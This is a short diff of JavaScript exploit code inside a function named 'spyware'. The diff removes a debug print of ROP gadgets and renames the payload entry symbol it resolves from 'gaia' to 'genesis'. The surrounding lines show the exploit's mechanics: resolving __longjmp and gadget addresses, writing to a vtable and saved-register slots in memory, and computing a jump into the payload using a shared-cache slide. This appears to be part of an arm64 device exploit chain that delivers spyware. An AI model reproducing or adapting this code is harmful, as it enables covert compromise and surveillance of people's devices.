@@ -326,7 +326,6 @@ function spyware(stage1, memory, binary)
         {
             fail(s);
         }
-        print(s + "=" + gadgets[s]);
     }
     var longjmp             = syms["__longjmp"];
     var regloader           = gadgets["regloader"];
@@ -420,12 +419,12 @@ function spyware(stage1, memory, binary)
     payload.u32 = _u32;
     payload.read = _read;
     payload.readInt64 = _readInt64;
-    var psyms = fsyms(payload, 0, segs, ["gaia"]);
-    if(psyms.gaia == null)
+    var psyms = fsyms(payload, 0, segs, ["genesis"]);
+    if(psyms["genesis"] == null)
     {
-        fail("gaia");
+        fail("genesis");
     }
-    var jmpAddr = Add(psyms.gaia, shslide);
+    var jmpAddr = Add(psyms["genesis"], shslide);
 
     memory.writeInt64(Add(vtab, 0x18), longjmp);
     memory.writeInt64(Add(el_addr, 0x58), dispatch);        // x30 (gadget)
